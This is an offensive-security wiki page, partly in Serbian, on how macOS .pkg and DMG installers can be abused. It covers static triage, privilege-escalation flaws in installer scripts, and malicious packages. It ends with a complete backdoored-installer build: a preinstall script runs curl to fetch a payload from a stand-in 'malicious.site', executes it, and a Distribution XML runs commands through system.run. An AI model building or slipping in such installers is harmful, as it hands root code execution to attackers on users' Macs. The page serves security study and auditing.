# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

A macOS **installer package** (also known as a `.pkg` file) is a file format used by macOS to **distribute software**. These files are like a **box that contains everything a piece of software** needs to install and run correctly.

The package file itself is an archive that holds a **hierarchy of files and directories that will be installed on the target** computer. It can also include **scripts** to perform tasks before and after the installation, like setting up configuration files or cleaning up old versions of the software.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Prilagođavanja (naslov, tekst dobrodošlice…) i skript/provere instalacije
- **PackageInfo (xml)**: Informacije, zahtevi za instalaciju, lokacija instalacije, putanje do skripti za pokretanje
- **Bill of materials (bom)**: Lista fajlova za instalaciju, ažuriranje ili uklanjanje sa dozvolama za fajlove
- **Payload (CPIO archive gzip compressed)**: Fajlovi za instalaciju u `install-location` iz PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre i post install skripte i više resursa izdvojenih u privremeni direktorijum za izvršavanje.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Da biste vizuelizovali sadržaj instalera bez ručnog dekompresovanja, možete koristiti i besplatan alat [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Static triage shortcuts

Ako je cilj analiza, pokušajte da **izbegnete prvo otvaranje paketa sa `Installer.app`**. Neki paketi mogu da izvrše kod čim ih Installer otvori (na primer preko `system.run()` ili installer plug-in-ova), pa je offline ekstrakcija obično bezbednija početna tačka.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Osnovne informacije o DMG

DMG fajlovi, ili Apple Disk Images, su format fajla koji Apple-ov macOS koristi za disk slike. DMG fajl je u suštini **montabilna disk slika** (sadrži sopstveni fajl sistem) koja sadrži sirove blok podatke, obično kompresovane, a ponekad i enkriptovane. Kada otvorite DMG fajl, macOS ga **montira kao da je fizički disk**, što vam omogućava da pristupite njegovom sadržaju.

> [!CAUTION]
> Imajte na umu da **`.dmg`** instaleri podržavaju **toliko mnogo formata** da su se u prošlosti neki od njih, koji su sadržali ranjivosti, zloupotrebljavali za dobijanje **kernel code execution**.

### Hijerarhija

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hijerarhija DMG fajla može biti različita u zavisnosti od sadržaja. Međutim, za application DMGs, obično prati ovu strukturu:

- Top Level: Ovo je koren disk slike. Često sadrži aplikaciju i možda link ka Applications folderu.
- Application (.app): Ovo je stvarna aplikacija. U macOS-u, aplikacija je obično paket koji sadrži mnogo pojedinačnih fajlova i foldera koji čine aplikaciju.
- Applications Link: Ovo je prečica do Applications foldera u macOS-u. Svrha ovoga je da olakša instalaciju aplikacije. Možete prevući .app fajl na ovu prečicu da biste instalirali aplikaciju.

## Privesc preko pkg abuse

### Izvršavanje iz javnih direktorijuma

Ako pre ili post installation script, na primer, izvršava nešto iz **`/var/tmp/Installerutil`**, a napadač može da kontroliše taj script, može da eskalira privilegije svaki put kada se on izvrši. Ili sličan primer:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Ovo je [javna funkcija](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) koju će nekoliko instalera i updatera pozvati da bi **izvršili nešto kao root**. Ova funkcija kao parametar prihvata **path** do **fajla** koji treba **izvršiti**, međutim, ako napadač može da **modifikuje** taj fajl, moći će da **zloupotrebi** njegovo izvršavanje kao root da bi **eskalirao privilegije**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Za više informacija pogledajte ovaj talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Environment and shebang abuse

Moderni PackageKit bagovi su pokazali da se installer skripte često izvršavaju kao **trusted root code** dok i dalje zadržavaju kontekst kojim upravlja napadač u blizini. Kada auditirate vendor pakete, obratite posebnu pažnju na:

- Shell interpreters kao što su `#!/bin/zsh` / `#!/bin/bash`
- Pozive poput `sudo -u $USER`, `launchctl asuser`, ili bilo koju logiku koja veruje `$USER`, `$HOME`, `PATH`, `TMPDIR`, ili relativnim putanjama
- Non-shell interpreters koji mogu učitavati user-controlled init fajlove ili biblioteke
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Za grešku PackageKit root-okruženja iz 2024. (`~/.zshenv` / `~/.bash*` nasleđivanje tokom instalacija pokrenutih od strane korisnika), pogledaj [generic macOS privesc page](../macos-privilege-escalation.md). Ako je paket **Apple-signed**, ista greška u skripti može postati i **SIP/TCC-relevant** jer `system_installd` može nositi `com.apple.rootless.install.heritable`; vidi [the SIP page](../macos-security-protections/macos-sip.md).

### Execution by mounting

Ako installer upisuje u `/tmp/fixedname/bla/bla`, moguće je **napraviti mount** preko `/tmp/fixedname` sa noowners, tako da možeš **izmeniti bilo koji fajl tokom instalacije** i zloupotrebiti proces instalacije.

Primer za ovo je **CVE-2021-26089**, koji je uspeo da **prepiše periodični skript** da bi dobio izvršavanje kao root. Za više informacija pogledaj predavanje: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

Moguće je jednostavno generisati **`.pkg`** fajl sa **pre i post-install skriptama** bez ikakvog stvarnog payload-a osim malware-a unutar skripti.

### JS in Distribution xml

Moguće je dodati **`<script>`** tagove u **distribution xml** fajl paketa i taj kod će biti izvršen, a može i da **izvršava komande** koristeći **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

U distribution paketima ovo obično zavisi od toga da li fajl najvišeg nivoa `Distribution` omogućava eksterne skripte, na primer sa `allow-external-scripts="true"`. Zato pregled samo `preinstall` / `postinstall` nije dovoljan: sam **Distribution XML** može da sadrži `installation-check` / `volume-check` hook-ove i direktne `system.run()` / `system.runOnce()` putanje izvršavanja.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Zlonamerni installer koji koristi skriptu i JS kod unutar dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Reference

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
